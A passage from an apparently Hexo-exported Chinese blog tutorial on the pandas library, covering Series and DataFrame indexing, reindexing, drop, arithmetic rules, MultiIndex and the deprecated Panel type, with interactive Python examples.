int64</span><br></pre></td></tr></table></figure>
<p>Series类型的操作类似python字典类型</p>
</li>
<li><p>通过自定义索引访问</p>
</li>
<li><p>保留字<code>in</code>操作</p>
</li>
<li><p>使用<code>.get()</code>方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;c&#x27;</span> <span class="keyword">in</span> b	<span class="comment"># 可以判断自定义索引</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span> <span class="keyword">in</span> b		<span class="comment"># 不能判断自动索引</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.get(<span class="string">&#x27;f&#x27;</span>, <span class="number">100</span>)</span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h4 id="Series类型对齐操作"><a href="#Series类型对齐操作" class="headerlink" title="Series类型对齐操作"></a>Series类型对齐操作</h4><p>Series对齐操作：Series + Series，索引值相同的进行运算，索引不同的不进行运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">c    <span class="number">1</span></span><br><span class="line">d    <span class="number">2</span></span><br><span class="line">e    <span class="number">3</span></span><br><span class="line">dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</span><br><span class="line">a    NaN</span><br><span class="line">b    NaN</span><br><span class="line">c    <span class="number">8.0</span></span><br><span class="line">d    <span class="number">8.0</span></span><br><span class="line">e    NaN</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>


<h4 id="Series类型的name"><a href="#Series类型的name" class="headerlink" title="Series类型的name"></a>Series类型的name</h4><p>Series对象和索引都可以有一个名字，存储在<code>属性.name</code>中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.name = <span class="string">&#x27;Series对象&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.index.name = <span class="string">&#x27;索引对象&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">索引对象</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">Name: Series对象, dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.index</span><br><span class="line">Index([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>, name=<span class="string">&#x27;索引对象&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h4 id="Series类型的修改"><a href="#Series类型的修改" class="headerlink" title="Series类型的修改"></a>Series类型的修改</h4><p>Series对象可以随时修改并立即生效</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">索引对象</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">Name: Series对象, dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="string">&#x27;a&#x27;</span>] = <span class="number">15</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.name = <span class="string">&#x27;New Series&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>] = <span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">索引对象</span><br><span class="line">a    <span class="number">15</span></span><br><span class="line">b    <span class="number">20</span></span><br><span class="line">c    <span class="number">20</span></span><br><span class="line">d     <span class="number">6</span></span><br><span class="line">Name: New Series, dtype: int64</span><br></pre></td></tr></table></figure>


<h3 id="DataFrame类型"><a href="#DataFrame类型" class="headerlink" title="DataFrame类型"></a>DataFrame类型</h3><p>DataFrame类型由共用相同索引的一组列组成，如下纵向的叫做<code>index</code>，其坐标轴为<code>axis=0</code>，横向的叫做<code>column</code>，其坐标轴为<code>axis=1</code></p>
<ul>
<li>DataFrame是一个表格型的数据类型，每列值类型可以不同</li>
<li>DataFrame既有行索引，也有列索引</li>
<li>DataFrame常用于表达二位数据，但也可以用来表达多维数据</li>
</ul>
<p><img src="/2021/02/12/Pandas%E5%BA%93%E5%85%A5%E9%97%A8/2.png"></p>
<p>DataFrame可以由以下类型来创建：</p>
<ul>
<li><p>二维ndarray对象</p>
<ul>
<li><code>pd.DataFrame(numpy.arange(10).reshape(2, 5))</code></li>
</ul>
</li>
<li><p>一维ndarray、列表、字典、元组或Series构成的字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 由Series构成的字段创建DataFrame</span></span><br><span class="line"><span class="comment"># 字典中的键成了列索引</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dt = &#123;<span class="string">&#x27;one&#x27;</span>:pd.Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]),</span><br><span class="line"><span class="meta">... </span><span class="string">&#x27;two&#x27;</span>:pd.Series([<span class="number">9</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>], index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = pd.DataFrame(dt)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">   one  two</span><br><span class="line">a  <span class="number">1.0</span>    <span class="number">9</span></span><br><span class="line">b  <span class="number">2.0</span>    <span class="number">9</span></span><br><span class="line">c  <span class="number">3.0</span>    <span class="number">7</span></span><br><span class="line">d  NaN    <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.DataFrame(dt, index=[<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>], columns=[<span class="string">&#x27;two&#x27;</span>, <span class="string">&#x27;three&#x27;</span>])</span><br><span class="line">   two three</span><br><span class="line">b    <span class="number">9</span>   NaN</span><br><span class="line">c    <span class="number">7</span>   NaN</span><br><span class="line">d    <span class="number">6</span>   NaN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以列表类似的字典创建</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dl = &#123;<span class="string">&#x27;one&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], <span class="string">&#x27;two&#x27;</span>:[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = pd.DataFrame(dl, index=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">   one two</span><br><span class="line">a    <span class="number">1</span>   a</span><br><span class="line">b    <span class="number">2</span>   b</span><br><span class="line">c    <span class="number">3</span>   c</span><br><span class="line">d    <span class="number">4</span>   d</span><br></pre></td></tr></table></figure></li>
<li><p>Series类型</p>
</li>
<li><p>其他DataFrame类型</p>
</li>
</ul>
<h4 id="DataFrame类型的基本操作"><a href="#DataFrame类型的基本操作" class="headerlink" title="DataFrame类型的基本操作"></a>DataFrame类型的基本操作</h4><p>通过<code>[columns]</code>直接获取columns数据，此数据为Series类型，通过<code>[columns][index]</code>获取<code>value</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">   one two</span><br><span class="line">a    <span class="number">1</span>   a</span><br><span class="line">b    <span class="number">2</span>   b</span><br><span class="line">c    <span class="number">3</span>   c</span><br><span class="line">d    <span class="number">4</span>   d</span><br><span class="line"><span class="comment"># 获取one column数据</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;one&#x27;</span>]</span><br><span class="line">a    <span class="number">1</span></span><br><span class="line">b    <span class="number">2</span></span><br><span class="line">c    <span class="number">3</span></span><br><span class="line">d    <span class="number">4</span></span><br><span class="line"><span class="comment"># 获取two column数据</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;two&#x27;</span>]</span><br><span class="line">a    a</span><br><span class="line">b    b</span><br><span class="line">c    c</span><br><span class="line">d    d</span><br><span class="line"><span class="comment"># 获取value</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;one&#x27;</span>][<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>


<h2 id="Pandas库的数据类型操作"><a href="#Pandas库的数据类型操作" class="headerlink" title="Pandas库的数据类型操作"></a>Pandas库的数据类型操作</h2><h3 id="改变Series和DataFrame对象"><a href="#改变Series和DataFrame对象" class="headerlink" title="改变Series和DataFrame对象"></a>改变Series和DataFrame对象</h3><ul>
<li><p>增加或重排：重新索引</p>
</li>
<li><p>删除：drop</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dl = &#123;<span class="string">&#x27;城市&#x27;</span>:[<span class="string">&#x27;北京&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;广州&#x27;</span>,<span class="string">&#x27;深圳&#x27;</span>,<span class="string">&#x27;沈阳&#x27;</span>],</span><br><span class="line"><span class="meta">... </span><span class="string">&#x27;环比&#x27;</span>:[<span class="number">101.5</span>,<span class="number">101.2</span>,<span class="number">101.3</span>,<span class="number">102.0</span>,<span class="number">100.1</span>],</span><br><span class="line"><span class="meta">... </span><span class="string">&#x27;同比&#x27;</span>:[<span class="number">120.7</span>,<span class="number">127.3</span>,<span class="number">119.4</span>,<span class="number">140.9</span>,<span class="number">101.4</span>],</span><br><span class="line"><span class="meta">... </span><span class="string">&#x27;定基&#x27;</span>:[<span class="number">121.4</span>,<span class="number">127.8</span>,<span class="number">120.0</span>,<span class="number">145.5</span>,<span class="number">101.6</span>]&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = pd.DataFrame(dl, index=[<span class="string">&#x27;c1&#x27;</span>,<span class="string">&#x27;c2&#x27;</span>,<span class="string">&#x27;c3&#x27;</span>,<span class="string">&#x27;c4&#x27;</span>,<span class="string">&#x27;c5&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br></pre></td></tr></table></figure>


<h4 id="重新索引"><a href="#重新索引" class="headerlink" title="重新索引"></a>重新索引</h4><p><code>.reindex()</code>能够改变或重排Series和DataFrame索引</p>
<ul>
<li><p>以<code>columns</code>重排列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = d.reindex(columns=[<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;定基&#x27;</span>,<span class="string">&#x27;同比&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     定基     同比     环比</span><br><span class="line">c1  北京  <span class="number">121.4</span>  <span class="number">120.7</span>  <span class="number">101.5</span></span><br><span class="line">c2  上海  <span class="number">127.8</span>  <span class="number">127.3</span>  <span class="number">101.2</span></span><br><span class="line">c3  广州  <span class="number">120.0</span>  <span class="number">119.4</span>  <span class="number">101.3</span></span><br><span class="line">c4  深圳  <span class="number">145.5</span>  <span class="number">140.9</span>  <span class="number">102.0</span></span><br><span class="line">c5  沈阳  <span class="number">101.6</span>  <span class="number">101.4</span>  <span class="number">100.1</span></span><br></pre></td></tr></table></figure></li>
<li><p>以<code>index</code>重排列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = d.reindex(index=[<span class="string">&#x27;c5&#x27;</span>,<span class="string">&#x27;c4&#x27;</span>,<span class="string">&#x27;c3&#x27;</span>,<span class="string">&#x27;c2&#x27;</span>,<span class="string">&#x27;c1&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     定基     同比     环比</span><br><span class="line">c5  沈阳  <span class="number">101.6</span>  <span class="number">101.4</span>  <span class="number">100.1</span></span><br><span class="line">c4  深圳  <span class="number">145.5</span>  <span class="number">140.9</span>  <span class="number">102.0</span></span><br><span class="line">c3  广州  <span class="number">120.0</span>  <span class="number">119.4</span>  <span class="number">101.3</span></span><br><span class="line">c2  上海  <span class="number">127.8</span>  <span class="number">127.3</span>  <span class="number">101.2</span></span><br><span class="line">c1  北京  <span class="number">121.4</span>  <span class="number">120.7</span>  <span class="number">101.5</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h4 id="索引类型的常用方法"><a href="#索引类型的常用方法" class="headerlink" title="索引类型的常用方法"></a>索引类型的常用方法</h4><p>在Series和DataFrame的索引是<code>Index</code>类型，<code>Index</code>对象本身属于不可修改的，其常用方法如下：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>.append(idx)</code></td>
<td>连接另一个<code>Index</code>对象，产生新的<code>Index</code>对象</td>
</tr>
<tr>
<td><code>.diff(idx)</code></td>
<td>计算差集，产生新的<code>Index</code>对象</td>
</tr>
<tr>
<td><code>.intersection(idx)</code></td>
<td>计算交集</td>
</tr>
<tr>
<td><code>.union(idx)</code></td>
<td>计算并集</td>
</tr>
<tr>
<td><code>.delete(loc)</code></td>
<td>删除loc位置处的元素</td>
</tr>
<tr>
<td><code>.insert(loc, e)</code></td>
<td>在loc位置处增加一个元素e</td>
</tr>
</tbody></table>
<ul>
<li><p>插入一个新的<code>columns</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>newc = d.columns.insert(<span class="number">4</span>, <span class="string">&#x27;新增&#x27;</span>)	<span class="comment"># 获取原来的columns，inser插入了一个新列</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>newc</span><br><span class="line">Index([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;定基&#x27;</span>, <span class="string">&#x27;同比&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>, <span class="string">&#x27;新增&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>newd = d.reindex(columns=newc, fill_value=<span class="number">200</span>)	<span class="comment"># 以新的columns列表重新排列，并设置填充值fill_value为200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>newd</span><br><span class="line">    城市     定基     同比     环比   新增</span><br><span class="line">c5  沈阳  <span class="number">101.6</span>  <span class="number">101.4</span>  <span class="number">100.1</span>  <span class="number">200</span></span><br><span class="line">c4  深圳  <span class="number">145.5</span>  <span class="number">140.9</span>  <span class="number">102.0</span>  <span class="number">200</span></span><br><span class="line">c3  广州  <span class="number">120.0</span>  <span class="number">119.4</span>  <span class="number">101.3</span>  <span class="number">200</span></span><br><span class="line">c2  上海  <span class="number">127.8</span>  <span class="number">127.3</span>  <span class="number">101.2</span>  <span class="number">200</span></span><br><span class="line">c1  北京  <span class="number">121.4</span>  <span class="number">120.7</span>  <span class="number">101.5</span>  <span class="number">200</span></span><br></pre></td></tr></table></figure></li>
<li><p>删除第二个<code>columns</code>，插入一个<code>index</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     定基     同比     环比</span><br><span class="line">c5  沈阳  <span class="number">101.6</span>  <span class="number">101.4</span>  <span class="number">100.1</span></span><br><span class="line">c4  深圳  <span class="number">145.5</span>  <span class="number">140.9</span>  <span class="number">102.0</span></span><br><span class="line">c3  广州  <span class="number">120.0</span>  <span class="number">119.4</span>  <span class="number">101.3</span></span><br><span class="line">c2  上海  <span class="number">127.8</span>  <span class="number">127.3</span>  <span class="number">101.2</span></span><br><span class="line">c1  北京  <span class="number">121.4</span>  <span class="number">120.7</span>  <span class="number">101.5</span></span><br><span class="line"><span class="comment"># 删除columns</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nc = d.columns.delete(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nc</span><br><span class="line">Index([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;定基&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line"><span class="comment"># 增加index</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ni = d.index.insert(<span class="number">5</span>, <span class="string">&#x27;c0&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ni</span><br><span class="line">Index([<span class="string">&#x27;c5&#x27;</span>, <span class="string">&#x27;c4&#x27;</span>, <span class="string">&#x27;c3&#x27;</span>, <span class="string">&#x27;c2&#x27;</span>, <span class="string">&#x27;c1&#x27;</span>, <span class="string">&#x27;c0&#x27;</span>], dtype=<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line"><span class="comment"># 重排，c0由c1填充</span></span><br><span class="line"><span class="comment"># 这里如果是nd = d.reindex(index=ni, columns=nc, method=&#x27;ffill&#x27;)则会报错，可能是pandas版本不同</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nd = d.reindex(index=ni, columns=nc).ffill()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nd</span><br><span class="line">    城市     定基     环比</span><br><span class="line">c5  沈阳  <span class="number">101.6</span>  <span class="number">100.1</span></span><br><span class="line">c4  深圳  <span class="number">145.5</span>  <span class="number">102.0</span></span><br><span class="line">c3  广州  <span class="number">120.0</span>  <span class="number">101.3</span></span><br><span class="line">c2  上海  <span class="number">127.8</span>  <span class="number">101.2</span></span><br><span class="line">c1  北京  <span class="number">121.4</span>  <span class="number">101.5</span></span><br><span class="line">c0  北京  <span class="number">121.4</span>  <span class="number">101.5</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h4 id="drop删除索引元素"><a href="#drop删除索引元素" class="headerlink" title="drop删除索引元素"></a>drop删除索引元素</h4><p><code>.drop</code>可以删除Series和DataFrame指定的行或列索引</p>
<ul>
<li><p>Series删除索引元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = pd.Series([<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>], index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">b    <span class="number">8</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">dtype: int64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.drop([<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">a    <span class="number">9</span></span><br><span class="line">d    <span class="number">6</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li>
<li><p>DataFrame删除指定行、列索引元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     定基     同比     环比</span><br><span class="line">c5  沈阳  <span class="number">101.6</span>  <span class="number">101.4</span>  <span class="number">100.1</span></span><br><span class="line">c4  深圳  <span class="number">145.5</span>  <span class="number">140.9</span>  <span class="number">102.0</span></span><br><span class="line">c3  广州  <span class="number">120.0</span>  <span class="number">119.4</span>  <span class="number">101.3</span></span><br><span class="line">c2  上海  <span class="number">127.8</span>  <span class="number">127.3</span>  <span class="number">101.2</span></span><br><span class="line">c1  北京  <span class="number">121.4</span>  <span class="number">120.7</span>  <span class="number">101.5</span></span><br><span class="line"><span class="comment"># 删除index c5，默认axis=0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.drop(<span class="string">&#x27;c5&#x27;</span>)</span><br><span class="line">    城市     定基     同比     环比</span><br><span class="line">c4  深圳  <span class="number">145.5</span>  <span class="number">140.9</span>  <span class="number">102.0</span></span><br><span class="line">c3  广州  <span class="number">120.0</span>  <span class="number">119.4</span>  <span class="number">101.3</span></span><br><span class="line">c2  上海  <span class="number">127.8</span>  <span class="number">127.3</span>  <span class="number">101.2</span></span><br><span class="line">c1  北京  <span class="number">121.4</span>  <span class="number">120.7</span>  <span class="number">101.5</span></span><br><span class="line"><span class="comment"># 删除columns 城市，需要指定axis=1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.drop(<span class="string">&#x27;城市&#x27;</span>, axis=<span class="number">1</span>)</span><br><span class="line">       定基     同比     环比</span><br><span class="line">c5  <span class="number">101.6</span>  <span class="number">101.4</span>  <span class="number">100.1</span></span><br><span class="line">c4  <span class="number">145.5</span>  <span class="number">140.9</span>  <span class="number">102.0</span></span><br><span class="line">c3  <span class="number">120.0</span>  <span class="number">119.4</span>  <span class="number">101.3</span></span><br><span class="line">c2  <span class="number">127.8</span>  <span class="number">127.3</span>  <span class="number">101.2</span></span><br><span class="line">c1  <span class="number">121.4</span>  <span class="number">120.7</span>  <span class="number">101.5</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h2 id="Pandas库数据类型运算"><a href="#Pandas库数据类型运算" class="headerlink" title="Pandas库数据类型运算"></a>Pandas库数据类型运算</h2><h3 id="算术运算法则"><a href="#算术运算法则" class="headerlink" title="算术运算法则"></a>算术运算法则</h3><ul>
<li>根据行列索引，补齐后运算，运算默认产生浮点数</li>
<li>补齐残缺项默认填充<code>NaN</code></li>
<li>维度不同运算采取广播运算<ul>
<li>广播运算，即低维度的将作用到高维度的每个数据上</li>
<li>一维Series默认在<code>axis=1</code>轴上参与运算</li>
</ul>
</li>
<li>采用<code>+-*/</code>符号进行的二元运算会产生新的对象</li>
<li>运算也有一些方法，如<code>.add/.sub</code>等，采用方法可以多设定一些额外参数</li>
</ul>
<h3 id="比较运算法则"><a href="#比较运算法则" class="headerlink" title="比较运算法则"></a>比较运算法则</h3><ul>
<li>比较运算只能比较相同索引的元素，不进行补齐</li>
<li>不同维度采取 广播运算</li>
<li>采用<code>&gt; &lt; &gt;= &lt;= == !=</code>等符号进行的二元运算会产生布尔对象</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://pandas.pydata.org/docs/">pandas documentation</a></p>
<p><a href="https://pandas.pydata.org/docs/reference/index.html">pandas - API reference</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>数据分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas库入门（二）</title>
    <url>/2021/02/16/Pandas%E5%BA%93%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>pandas库入门 - 补充</p>
<a id="more"></a>

<h2 id="MultiIndex与Panel"><a href="#MultiIndex与Panel" class="headerlink" title="MultiIndex与Panel"></a>MultiIndex与Panel</h2><h3 id="MultiIndex"><a href="#MultiIndex" class="headerlink" title="MultiIndex"></a>MultiIndex</h3><p>通过<code>set_index([...])</code>可以设置索引，当设置多个索引时，<code>Index</code>对象会成为<code>MultiIndex</code>对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.set_index([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>])</span><br><span class="line">             同比     定基</span><br><span class="line">城市 环比</span><br><span class="line">北京 <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">上海 <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">广州 <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">深圳 <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">沈阳 <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.set_index([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>]).index</span><br><span class="line">MultiIndex([(<span class="string">&#x27;北京&#x27;</span>, <span class="number">101.5</span>),</span><br><span class="line">            (<span class="string">&#x27;上海&#x27;</span>, <span class="number">101.2</span>),</span><br><span class="line">            (<span class="string">&#x27;广州&#x27;</span>, <span class="number">101.3</span>),</span><br><span class="line">            (<span class="string">&#x27;深圳&#x27;</span>, <span class="number">102.0</span>),</span><br><span class="line">            (<span class="string">&#x27;沈阳&#x27;</span>, <span class="number">100.1</span>)],</span><br><span class="line">           names=[<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p><code>MultiIndex</code>是多级或分层索引，拥有属性<code>names</code>和<code>levels</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.set_index([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>]).index.names</span><br><span class="line">FrozenList([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.set_index([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;环比&#x27;</span>]).index.levels</span><br><span class="line">FrozenList([[<span class="string">&#x27;上海&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;广州&#x27;</span>, <span class="string">&#x27;沈阳&#x27;</span>, <span class="string">&#x27;深圳&#x27;</span>], [<span class="number">100.1</span>, <span class="number">101.2</span>, <span class="number">101.3</span>, <span class="number">101.5</span>, <span class="number">102.0</span>]])</span><br></pre></td></tr></table></figure>

<h3 id="Panel"><a href="#Panel" class="headerlink" title="Panel"></a>Panel</h3><p>面板数据，用于存储三维数据（从pandas 0.20.0开始已经弃用），推荐使用DataFrame</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = pd.Panel(numpy.arange(<span class="number">24</span>).reshape(<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>),items=<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>),major_axis=pd.date_range(<span class="string">&#x27;20210210&#x27;</span>,periods=<span class="number">3</span>),minor_axis=[<span class="string">&#x27;first&#x27;</span>,<span class="string">&#x27;second&#x27;</span>])</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: Panel() takes no arguments	<span class="comment"># Panel已弃用</span></span><br></pre></td></tr></table></figure>


<h2 id="组合索引-loc与iloc"><a href="#组合索引-loc与iloc" class="headerlink" title="组合索引 loc与iloc"></a>组合索引 loc与iloc</h2><p><code>loc</code>和<code>iloc</code>可以实现组合索引，其中<code>loc</code>针对自定义索引，<code>iloc</code>针对自动索引</p>
